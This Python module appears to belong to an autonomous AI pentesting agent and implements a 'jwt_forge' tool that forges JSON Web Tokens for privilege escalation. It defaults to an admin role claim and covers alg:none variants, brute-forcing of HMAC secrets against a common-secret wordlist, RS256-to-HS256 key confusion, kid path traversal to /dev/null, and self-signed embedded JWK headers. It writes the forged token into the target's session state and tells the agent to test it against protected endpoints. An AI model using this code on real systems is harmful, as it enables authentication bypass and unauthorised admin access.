"""
hellhound/core/tools/jwt_tools.py - JWT forgery primitives.

Split slice 2 from agent.py (see the agent-py-split-plan note). jwt_forge is pure
crypto - it builds/forges JWTs (alg:none, HS256 secret cracking, RSA->HS256
confusion, kid/jwk tricks) and never touches the network or any agent.py
internal, so it lifts out with ZERO coupling (not even the _do_curl shim that
access_probes needed). agent.py re-imports the executor + the COMMON_JWT_SECRETS
wordlist, so TOOL_REGISTRY wiring and any existing imports resolve unchanged.
"""
import base64
import hashlib
import hmac
import json
import secrets
from typing import Any, Dict

from hellhound.core.tasks import Target, save_target


COMMON_JWT_SECRETS = (
    "secret", "Secret", "SECRET", "your-256-bit-secret", "your-secret-key", "secretkey",
    "jwtsecret", "jwt_secret", "jwt-secret", "jwt-secret-key", "supersecret", "super-secret",
    "changeme", "change-me", "password", "Password1", "123456", "admin", "test", "testing",
    "qwerty", "letmein", "topsecret", "top-secret", "key", "private", "privatekey",
    "mysecretkey", "s3cr3t", "verysecret", "very-secret-key", "shhhh", "shh",
    "flag", "ctf", "hackthebox", "tryhackme", "thm", "htb", "development", "dev",
    "production", "prod", "prod_secret", "backend_secret", "api_secret", "api-secret",
    "auth_secret", "session_secret", "signing_key", "signingkey", "hmac_secret",
    "null", "undefined", "none", "0", "1", "abc123", "letmein123", "welcome",
    "django-insecure", "insecure", "not-a-secret", "some-secret", "webtoken",
    "webtokensecret", "jsonwebtoken", "jwtkey", "jwt.io", "keyboard cat",
    "your-secret", "myapp_secret", "app_secret", "app-secret", "flask-secret-key",
    "express-secret", "node_secret", "", "0" * 32, "0" * 64,
)


def _execute_jwt_forge(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """
    Decode and forge JWTs for privilege escalation and auth bypass testing.
    Also safely handles the common false-friend case: a dot-separated,
    base64url-looking cookie (e.g. Flask's default 'session' cookie) that
    LOOKS like a JWT but is actually a framework-signed session blob with
    no claims structure. That case still gets fully decoded and returned
    via 'decoded_session_content' below instead of being turned away —
    only truly opaque, undecodable IDs (sess_..., connect.sid, PHPSESSID)
    are rejected outright, since those carry no embedded payload at all.
    Techniques (all run by default via algorithm='all', or select individually):
      - alg:none                unsigned-token bypass, case + trailing-dot variants
      - hs_crack                brute-forces the real HMAC secret against a built-in
                                 common-secret wordlist (or a supplied wordlist) and,
                                 on a hit, produces a *legitimately* signed forged token
      - hs256 confusion         RS256->HS256 public-key-as-HMAC-secret confusion, tried
                                 across several byte-encodings of the supplied key/secret
                                 since exact PEM formatting varies between JWT libraries
      - kid_injection           kid path-traversal to /dev/null, signed with an empty
                                 HMAC secret (classic CTF/lab trick — /dev/null reads as
                                 zero bytes, so an empty secret produces a valid signature)
      - jwk_injection           embeds a self-generated RSA public key directly in the
                                 header's `jwk` claim and self-signs with the matching
                                 private key, for servers that naively trust an inline jwk
                                 header instead of validating against a known key. Requires
                                 the `cryptography` package; skipped with a note if absent.
    """
    token = args.get("token")
    if not token and hasattr(target, "state") and isinstance(target.state, dict):
        token = target.state.get("auth_token")
        if not token and "cookies" in target.state and isinstance(target.state["cookies"], dict):
            for ck, cv in target.state["cookies"].items():
                if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
                    token = cv
                    break

    if not token:
        return {
            "status": "error",
            "error": "No JWT token provided or found in target session state.",
            "hint": "Inspect target session state. If cookies are opaque (e.g. sess_..., connect.sid, PHPSESSID), the application uses server-side sessions, NOT JWTs. Look for mass assignment, nested property injection, or business logic flaws instead."
        }

    # Terminal-result cache, keyed on the exact token string: whether a
    # value decodes as a real JWT (valid header+payload) or not is settled
    # BEFORE 'claims'/'algorithm' are ever read below, so that verdict is
    # identical no matter what claims/algorithm a later call passes. Without
    # this, the orchestrator's generic "already ran this exact tool+args"
    # dedup never fires here — varying claims/algorithm each time makes
    # every call look like a "new" attempt — and the model can burn several
    # calls re-testing a question that was already answered for good on the
    # first one. Cache the verdict per token and refuse instantly on repeats.
    #
    # Flask/itsdangerous session cookies also change on every request (the
    # flash-message payload rotates), so a NEW cookie value from the same
    # target still isn't caught by the per-token cache above — the model
    # kept re-triggering a fresh decode-and-fail cycle on every new session
    # cookie from the same target, printing a red error line in the CLI each
    # time even though the target's cookie FORMAT was already established.
    # Once we know a target uses non-JWT sessions at all, stop re-verifying
    # per-token and answer quietly (no error, no red line) instead.
    non_jwt_cache = None
    target_confirmed_non_jwt = False
    if hasattr(target, "state") and isinstance(target.state, dict):
        non_jwt_cache = target.state.setdefault("_confirmed_non_jwt_tokens", {})
        target_confirmed_non_jwt = bool(target.state.get("_target_uses_non_jwt_sessions"))

        if token in non_jwt_cache or target_confirmed_non_jwt:
            return {
                "status": "skipped",
                "note": (
                    "Already established this target's session cookies aren't JWTs — "
                    "skipping the re-check. Use decoded_session_content from the earlier "
                    "call, or work off the session directly."
                ),
                "decoded_session_content": non_jwt_cache.get(token),
            }

    # Strict check: Reject obvious placeholder strings or opaque cookies
    if "..." in token or token.startswith("sess_") or token.count(".") < 1:
        return {
            "status": "error",
            "error": f"The provided token '{token[:30]}...' is not a valid JSON Web Token (JWT). It appears to be an opaque session identifier or placeholder. JWT attacks (alg:none, algorithm confusion) only apply to dot-separated base64url JWTs.",
            "hint": "Do NOT attempt JWT forgery on opaque session cookies. Check application JavaScript and API endpoints for mass assignment (e.g. updating profile/account attributes via PATCH/PUT/POST) or IDOR."
        }


    def b64url_decode_json(s: str) -> Dict[str, Any]:
        s = s.replace("-", "+").replace("_", "/")
        s += "=" * ((4 - len(s) % 4) % 4)
        try:
            return json.loads(base64.b64decode(s).decode("utf-8", errors="ignore"))
        except Exception:
            return {}

    def b64url_decode_raw(s: str) -> bytes:
        s = s.replace("-", "+").replace("_", "/")
        s += "=" * ((4 - len(s) % 4) % 4)
        try:
            return base64.b64decode(s)
        except Exception:
            return b""

    def b64url_encode(obj: Any) -> str:
        if isinstance(obj, (dict, list)):
            raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
        elif isinstance(obj, str):
            raw = obj.encode("utf-8")
        elif isinstance(obj, bytes):
            raw = obj
        else:
            raw = bytes(obj)
        return base64.urlsafe_b64encode(raw).decode("utf-8").rstrip("=")

    def hs256_sign(hdr: Dict[str, Any], pay: Dict[str, Any], secret_bytes: bytes) -> str:
        hdr_b64 = b64url_encode(hdr)
        pay_b64 = b64url_encode(pay)
        signing_input = f"{hdr_b64}.{pay_b64}".encode("utf-8")
        sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
        return f"{hdr_b64}.{pay_b64}.{b64url_encode(sig)}"

    def try_non_jwt_session_decode(raw_segment: str):
        """
        Best-effort decode for dot-separated tokens that LOOK JWT-shaped but
        aren't — most commonly a framework-signed session cookie like
        Flask's itsdangerous sessions, which are also '.'-joined and
        base64url-encoded but carry a plain (optionally zlib-compressed)
        JSON blob with no JWT header/claims structure. Returns the decoded
        object if this reads as plausible JSON, else None.
        """
        raw = b64url_decode_raw(raw_segment)
        if not raw:
            return None
        try:
            return json.loads(raw.decode("utf-8"))
        except Exception:
            pass
        try:
            import zlib
            return json.loads(zlib.decompress(raw).decode("utf-8"))
        except Exception:
            return None

    parts = token.strip().split(".")
    if len(parts) < 2:
        return {
            "status": "error",
            "error": "Token is not a valid JWT (must have at least 2 dot-separated segments).",
            "hint": "Check if target uses opaque session cookies rather than JWTs."
        }

    header = b64url_decode_json(parts[0])
    payload = b64url_decode_json(parts[1])
    original_sig_b64 = parts[2] if len(parts) > 2 else ""

    if not header or not payload:
        # Don't just say "decode failed" — show what's actually in there.
        # Guessing claims (role/isAdmin/admin) blindly against a token that
        # was never a JWT (e.g. a Flask itsdangerous session cookie, which
        # is also dot-separated and superficially JWT-shaped) is exactly
        # what was happening before this fix: repeated forge attempts with
        # no grounding in the token's real content.
        raw_previews = []
        decoded_session_content = None
        for i, seg in enumerate(parts[:2]):
            raw_bytes = b64url_decode_raw(seg)
            if not raw_bytes:
                continue
            try:
                text_preview = raw_bytes[:200].decode("utf-8")
            except Exception:
                text_preview = repr(raw_bytes[:200])
            raw_previews.append(f"segment[{i}]: {text_preview}")
            if decoded_session_content is None:
                decoded_session_content = try_non_jwt_session_decode(seg)

        result = {
            "status": "not_a_jwt",
            "note": "Nah bro, this ain't a JWT — the segments don't even decode to valid JSON. Not going to sit here guessing claims out of thin air, so check raw_content_seen below for what's actually in there.",
            "raw_content_seen": raw_previews if raw_previews else "Segments did not even base64-decode to bytes.",
            "hint": "Do not guess/forge claims (role, isAdmin, admin, etc.) here — check raw_content_seen (and decoded_session_content, if present) for what's actually inside before assuming anything about this token. A dot-separated-but-non-JWT shape is common for framework-signed session cookies (e.g. Flask's itsdangerous sessions) carrying plain session/flash data, not auth claims — forging claims against those does nothing. If that's what this is, look for IDOR, mass assignment, or business-logic flaws instead. This is settled for this exact token — do not call jwt_forge on it again with different claims/algorithm values, that will not change anything."
        }
        if decoded_session_content is not None:
            result["decoded_session_content"] = decoded_session_content
            result["note"] = "Nah bro, it's not a JWT — just a plain signed session cookie (see decoded_session_content), no claims or role field in there for you to forge. This one's settled, don't call jwt_forge on it again."
        if non_jwt_cache is not None:
            non_jwt_cache[token] = decoded_session_content
        if hasattr(target, "state") and isinstance(target.state, dict):
            target.state["_target_uses_non_jwt_sessions"] = True
        return result

    target_claims = args.get("claims") or {"role": "admin"}
    forged_payload = dict(payload)
    forged_payload.update(target_claims)

    algo = (args.get("algorithm") or "all").lower()
    pub_or_secret = args.get("public_key_or_secret") or ""
    custom_wordlist = args.get("wordlist") or []

    forged_tokens = []
    techniques_run = []
    cracked_secret = None

    # 1. alg: none variations — case variants x with/without the trailing dot,
    # since different JWT libraries disagree on whether the empty signature
    # segment (and its trailing dot) must be present.
    if algo in ("none", "all"):
        techniques_run.append("alg_none")
        for alg_val in ("none", "None", "NONE"):
            hdr_none = dict(header)
            hdr_none["alg"] = alg_val
            hdr_b64 = b64url_encode(hdr_none)
            pay_b64 = b64url_encode(forged_payload)
            for suffix, style in ((".", "with trailing dot"), ("", "no trailing segment")):
                forged_tokens.append({
                    "type": f"alg:{alg_val}",
                    "description": f"Unsigned JWT with alg={alg_val} ({style})",
                    "token": f"{hdr_b64}.{pay_b64}{suffix}"
                })

    # 2. HS256 secret cracking — tests the ORIGINAL token's real signature
    # against a wordlist of common/default secrets. Unlike the confusion
    # attacks below, a hit here means the forged token is legitimately
    # signed with the application's actual key, not a validation-bypass
    # guess, so it will pass even a correctly-implemented verifier.
    #
    # Deliberately NOT included in the default 'all' bundle: the free
    # bypasses below (alg:none, kid_injection, jwk_injection) cost nothing
    # to try and often work on their own. Only run hs_crack explicitly
    # (algorithm='hs_crack') after testing those against the server and
    # confirming they were rejected — cracking is the escalation step, not
    # the first move.
    if algo == "hs_crack" and original_sig_b64 and header.get("alg", "").upper().startswith("HS"):
        techniques_run.append("hs_crack")
        signing_input = f"{parts[0]}.{parts[1]}".encode("utf-8")
        target_sig = b64url_decode_raw(original_sig_b64)
        candidates = list(dict.fromkeys(list(custom_wordlist) + list(COMMON_JWT_SECRETS)))
        digest_fn = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}.get(
            header.get("alg", "HS256").upper(), hashlib.sha256
        )
        for candidate in candidates:
            if not isinstance(candidate, str):
                continue
            guess_sig = hmac.new(candidate.encode("utf-8"), signing_input, digest_fn).digest()
            if hmac.compare_digest(guess_sig, target_sig):
                cracked_secret = candidate
                forged_tok = hs256_sign(header, forged_payload, candidate.encode("utf-8"))
                forged_tokens.insert(0, {
                    "type": f"alg:{header.get('alg')} (cracked secret)",
                    "description": f"Legitimately signed with recovered secret {candidate!r} — real key, not a bypass guess.",
                    "token": forged_tok
                })
                break
        if cracked_secret is None and emit and hasattr(emit, "info"):
            emit.info(f"[*] jwt_forge: tested {len(candidates)} common secrets against the HMAC signature — no match.")

    # 3. RS256 -> HS256 algorithm confusion (if public key/secret provided).
    # Tried across several byte-encodings of the key: exact JWT libraries
    # are picky about trailing newlines / CRLF vs LF / surrounding
    # whitespace in the PEM text used as the HMAC key, so a single encoding
    # often silently fails even when the underlying key is correct.
    if algo in ("hs256", "all") and pub_or_secret:
        techniques_run.append("hs256_confusion")
        raw = pub_or_secret
        variants = {
            "as-is": raw,
            "stripped": raw.strip(),
            "stripped+trailing-newline": raw.strip() + "\n",
            "CRLF-normalized": raw.replace("\r\n", "\n"),
        }
        seen_keys = set()
        for label, variant in variants.items():
            key_bytes = variant.encode("utf-8")
            if key_bytes in seen_keys:
                continue
            seen_keys.add(key_bytes)
            hdr_hs = dict(header)
            hdr_hs["alg"] = "HS256"
            tok_hs = hs256_sign(hdr_hs, forged_payload, key_bytes)
            forged_tokens.append({
                "type": "alg:HS256 (public key confusion)",
                "description": f"HMAC-SHA256 signed using supplied key/secret, encoding: {label}",
                "token": tok_hs
            })
        # Also try the raw base64-decoded bytes in case the captured "public
        # key" was actually base64 DER rather than PEM text.
        decoded = b64url_decode_raw(raw.strip())
        if decoded and decoded not in seen_keys:
            hdr_hs = dict(header)
            hdr_hs["alg"] = "HS256"
            tok_hs = hs256_sign(hdr_hs, forged_payload, decoded)
            forged_tokens.append({
                "type": "alg:HS256 (public key confusion)",
                "description": "HMAC-SHA256 signed using base64-decoded raw key bytes",
                "token": tok_hs
            })

    # 4. kid header path traversal to /dev/null. Some backends resolve the
    # `kid` header to a file path to load the signing key; pointing it at
    # /dev/null (which reads as zero bytes) lets an attacker sign with a
    # known, empty HMAC secret.
    if algo in ("kid_injection", "all"):
        techniques_run.append("kid_injection")
        for kid_val in ("../../../../../../../../../../dev/null", "/dev/null"):
            hdr_kid = dict(header)
            hdr_kid["kid"] = kid_val
            hdr_kid["alg"] = "HS256"
            tok_kid = hs256_sign(hdr_kid, forged_payload, b"")
            forged_tokens.append({
                "type": "kid:/dev/null (empty secret)",
                "description": f"kid='{kid_val}', signed with an empty HMAC secret",
                "token": tok_kid
            })

    # 5. Embedded JWK header self-signing — generate our own RSA keypair,
    # embed the public half directly in the header's `jwk` claim, and sign
    # with the matching private key. Servers that pull the verification key
    # straight out of the token's own header (instead of a trusted key
    # store) will happily validate a token signed by the attacker.
    if algo in ("jwk_injection", "all"):
        try:
            from cryptography.hazmat.primitives.asymmetric import rsa, padding
            from cryptography.hazmat.primitives import hashes

            techniques_run.append("jwk_injection")
            priv_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
            pub_numbers = priv_key.public_key().public_numbers()

            def int_to_b64url(n: int) -> str:
                length = (n.bit_length() + 7) // 8
                return b64url_encode(n.to_bytes(length, "big"))

            jwk = {
                "kty": "RSA",
                "kid": "attacker-key",
                "use": "sig",
                "alg": "RS256",
                "n": int_to_b64url(pub_numbers.n),
                "e": int_to_b64url(pub_numbers.e),
            }
            hdr_jwk = dict(header)
            hdr_jwk["alg"] = "RS256"
            hdr_jwk["jwk"] = jwk
            hdr_b64 = b64url_encode(hdr_jwk)
            pay_b64 = b64url_encode(forged_payload)
            signing_input = f"{hdr_b64}.{pay_b64}".encode("utf-8")
            signature = priv_key.sign(signing_input, padding.PKCS1v15(), hashes.SHA256())
            tok_jwk = f"{hdr_b64}.{pay_b64}.{b64url_encode(signature)}"
            forged_tokens.append({
                "type": "jwk_injection (embedded RSA key)",
                "description": "Header carries an attacker-generated RSA public key in `jwk`; token is self-signed with the matching private key.",
                "token": tok_jwk
            })
        except ImportError:
            if emit and hasattr(emit, "info"):
                emit.info("[*] jwt_forge: skipping jwk_injection — `cryptography` package not installed (pip install cryptography).")

    # Prefer a legitimately-cracked token as primary; otherwise fall back to
    # the first generated variant (kept for backward-compat behavior).
    if cracked_secret is not None:
        primary_token = forged_tokens[0]["token"]
    else:
        primary_token = forged_tokens[0]["token"] if forged_tokens else token

    # Auto-update target state only if original token was a JWT
    if hasattr(target, "state") and isinstance(target.state, dict):
        target.state["auth_token"] = primary_token
        target.state["forged_token"] = primary_token
        if "headers" not in target.state or not isinstance(target.state["headers"], dict):
            target.state["headers"] = {}
        target.state["headers"]["Authorization"] = f"Bearer {primary_token}"
        if "cookies" in target.state and isinstance(target.state["cookies"], dict):
            for ck, val in list(target.state["cookies"].items()):
                # Only replace if the original cookie value was actually the JWT
                if val == token or (isinstance(val, str) and val.startswith("eyJ")):
                    target.state["cookies"][ck] = primary_token
                    target.state["session_cookie"] = f"{ck}={primary_token}"
        save_target(target)

    hs_crack_available = (
        algo != "hs_crack"
        and bool(original_sig_b64)
        and header.get("alg", "").upper().startswith("HS")
    )

    return {
        "status": "success",
        "original_header": header,
        "original_payload": payload,
        "forged_payload": forged_payload,
        "primary_token": primary_token,
        "forged_tokens": forged_tokens,
        "techniques_run": techniques_run,
        "cracked_secret": cracked_secret,
        "hs_crack_available": hs_crack_available,
        "instructions": (
            "Primary forged token has been applied to target.state. Test the free/no-secret "
            "variants first (alg:none, kid_injection, jwk_injection) against discovered protected "
            "endpoints (e.g. /console, /dashboard) with curl/gowitness — these cost nothing and "
            "often work outright. "
            + (
                "Secret brute-forcing was NOT run this call. Only escalate to it if the free "
                "variants above are rejected: re-run jwt_forge with algorithm='hs_crack' (this "
                "token is HS-signed, so cracking applies)."
                if hs_crack_available else
                "If none of these pass, check the response body for details (some apps reject "
                "alg:none but leak the real secret via other means — try other forged_tokens "
                "variants individually)."
            )
        )
    }


